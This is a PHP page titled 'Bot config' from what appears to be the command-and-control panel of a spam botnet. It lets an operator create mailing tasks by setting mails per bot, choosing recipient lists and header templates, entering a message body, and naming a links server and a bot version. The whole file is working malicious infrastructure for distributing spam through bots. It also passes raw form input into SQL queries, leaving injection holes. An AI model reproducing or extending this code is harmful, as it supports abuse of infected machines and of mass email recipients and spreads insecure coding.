<?
  require("passwd.inc");
  $bodys_dir = "../bodys/";
  $headers_dir = "../headers/";
  $lists_dir = "../lists/";
  $tasks_dir = "../tasks/";

  function get_int($file) {
    global $tasks_dir;
    $f = fopen($tasks_dir.$file,"r");
    if (!$f) return -1;
    $c = fread($f,100);
    fclose($f);
    return $c;
  }

  require("../cfg.php");
  $action = $_GET['action'];

?>

<html>
<head>
<title>Bot config</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>

<?

  if ($action === "add") {
    
    $name = $_POST['name'];
    $mpb1  = $_POST['lpr1'];
    $mpb2  = $_POST['lpr2'];
    $listid = $_POST['list'];
    $hdrs = $_POST['hdr'];
    $body = $_POST['t_body'];
    $links_server = $_POST['links_server'];
    $links = $_POST['links'];
    $ver = $_POST['ver'];
    $style = $_POST['style'];

    if ($mpb1 < 2) $mpb1 = 2;
    if ($mpb2 > 500) $mpb2 = 500;

    $hdrs_list = "";
    for (Reset($hdrs); ($k = key($hdrs)); Next($hdrs)) {
      if ($hdrs_list === "") $hdrs_list = $k;
      else $hdrs_list .= ",$k";
    }

    $listres = @mysql_query("SELECT * FROM lists WHERE `id` = $listid;");
    if (!$listres) exit("Huevii list!!!");
    $list_file = mysql_result($listres,0,'file');
    $list_count = mysql_result($listres,0,'count');

    $bres = @mysql_query("SELECT * FROM tasks;");
    $bid = 0;
    for ($i=0; $i < mysql_num_rows($bres); $i++) if ($bid < mysql_result($bres,$i,'id')) $bid = mysql_result($bres,$i,'id');
    $bid++;

    echo $bid;

    $fp = fopen($tasks_dir.$bid, "w");
    fwrite ($fp, "0");
    fclose ($fp);

    $fp = fopen($bodys_dir.$bid, "w");
    fwrite ($fp, $body);
    fclose ($fp);

    $str_query = "INSERT INTO tasks (id, name, header, body_id, list, list_size, lpr1, lpr2, status, links_server, links, ver, style)
            VALUES ('$bid', '$name', '$hdrs_list', '$bid', '$list_file', '$list_count', '$mpb1', '$mpb2', '1', '$links_server', '$links', '$ver', '0');";
    @mysql_query($str_query)
             or die("Can't create task: $str_query");

  }

  echo "<hr>\r\n";
  echo "<div align='center'><h2>New Task</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";
  echo "<SCRIPT>function ow(e) { newWindow=window.open(e); newWindow.focus(); }</SCRIPT>";
  
?>
  <table align='CENTER' cellspacing="2">
  <tr><td colspan="2">

  <form action='./newtask.php?action=add' method='POST'>
  <table align='CENTER' border="1">
  <tr><td><b>&nbsp;Task Name</b></td><td><input name='name' type='TEXT'></td><tr>
  <tr><td><b>&nbsp;Mails per Bot min</b></td><td><input name='lpr1' type='TEXT' value='100'></td></tr>
  <tr><td><b>&nbsp;Mails per Bot max</b></td><td><input name='lpr2' type='TEXT' value='100'></td></tr>
  <tr><td><b>&nbsp;Links Server:</b></td><td><input name='links_server' type='TEXT' value='127.0.0.1'></td></tr>
  <tr><td><b>&nbsp;Links (optional):</b></td><td><input name='links' type='TEXT'></td></tr>
  <tr><td><b>&nbsp;Bot version (optional):</b></td><td><input name='ver' type='TEXT'></td></tr>
  </table>
  </td></tr>
  <tr><td align="RIGHT" valign="TOP">
  
  
  <table border='1'>
  <tr><td colspan='2'><b>Lists</b></td></tr>
  <tr><td>File</td><td>Count</td></tr>

<?
  $list = @mysql_query("SELECT * FROM lists;");
  
  for ($i=0; $i < @mysql_num_rows($list); $i++) {
      echo "<tr>";
      echo "<td><input type='RADIO' name='list' value='".mysql_result($list,$i,'id')."'>".mysql_result($list,$i,'file')."</td>";
      echo "<td>".mysql_result($list,$i,'count')."</td>";
      echo "</tr>";
  }
  
?>
  </table></td>
  
  <td align="LEFT" valign="TOP">
  <table border='1'>
  <tr><td colspan='2'>Headers</td></tr>  
  
<?
  $dir = opendir($headers_dir);
  chdir($headers_dir);
  while (($d = readdir($dir)) !== false) {
    if (is_file($d)) {
      if ($d === ".htaccess") continue;
      $filename = $headers_dir."$d";
      $text = stripslashes(join('',file($filename)));
      echo "<tr>";
      echo "<td><input type='CHECKBOX' name='hdr[$d]' value='$d'>$d</td>";
      //echo "<td><pre>$text</pre></td>";
      echo "<td><a href='javascript:ow(\"../checkheader.php?filename=$d\");'>Check</a></td>";
      echo "</tr>";
    }
  }
  closedir($dir);
?>
  </table> 
  <br>
  <div align='CENTER'>
  <textarea name='t_body' cols='50' rows='25'></textarea>
  <br>
  <input type='SUBMIT' value='New Task'>
  </div>

  </form>
  <td><tr>
  </table>

